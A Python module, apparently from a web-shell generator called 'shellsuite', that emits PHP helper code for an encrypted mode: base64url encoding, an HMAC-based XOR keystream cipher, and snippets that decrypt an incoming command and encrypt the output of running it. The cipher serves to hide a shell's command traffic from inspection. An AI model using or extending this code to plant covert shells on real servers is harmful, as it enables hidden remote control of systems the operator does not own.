"""PHP emission for encrypted-mode payload decryption and encryption.

Mirrors shellsuite/crypto.py. Constants come from the contract; they are
substituted with str.replace to avoid f-string brace escaping in the PHP.
"""

from __future__ import annotations

from shellsuite.protocol import contract

_HELPERS = """
function __ss_b64d($s) {
    $s = strtr($s, "-_", "+/");
    $pad = strlen($s) % 4;
    if ($pad) {
        $s .= str_repeat("=", 4 - $pad);
    }
    return base64_decode($s);
}

function __ss_b64e($s) {
    return rtrim(strtr(base64_encode($s), "+/", "-_"), "=");
}

function __ss_keystream($password, $nonce, $length) {
    $stream = "";
    $i = 0;
    while (strlen($stream) < $length) {
        $stream .= hash_hmac("sha256", $nonce . $i, $password, true);
        $i++;
    }
    return substr($stream, 0, $length);
}

function __ss_decrypt($payload, $password) {
    if (strpos($payload, "@PREFIX@") !== 0) {
        return "";
    }
    $raw = __ss_b64d(substr($payload, strlen("@PREFIX@")));
    $nonce_len = @NONCE_BYTES@;
    if ($raw === false || strlen($raw) < $nonce_len) {
        return "";
    }
    $nonce = substr($raw, 0, $nonce_len);
    $ct = substr($raw, $nonce_len);
    return $ct ^ __ss_keystream($password, $nonce, strlen($ct));
}

function __ss_encrypt($plaintext, $password) {
    $nonce = substr(md5(uniqid("", true) . mt_rand(), true), 0, @NONCE_BYTES@);
    $ct = $plaintext ^ __ss_keystream($password, $nonce, strlen($plaintext));
    return "@PREFIX@" . __ss_b64e($nonce . $ct);
}
"""


def php_helpers() -> str:
    """PHP helper functions for encrypted shells."""
    return (
        _HELPERS.replace("@PREFIX@", contract.ENCRYPTED_PREFIX)
        .replace("@NONCE_BYTES@", str(contract.NONCE_BYTES))
        .strip("\n")
    )


def decrypt_block() -> str:
    """PHP that decrypts the payload in place (yields "" on failure)."""
    return "$__ss_cmd = __ss_decrypt($__ss_cmd, $__ss_auth);"


def encrypt_expr() -> str:
    """PHP expression that encrypts the command output with the password."""
    return "__ss_encrypt(__ss_run($__ss_cmd), $__ss_auth)"
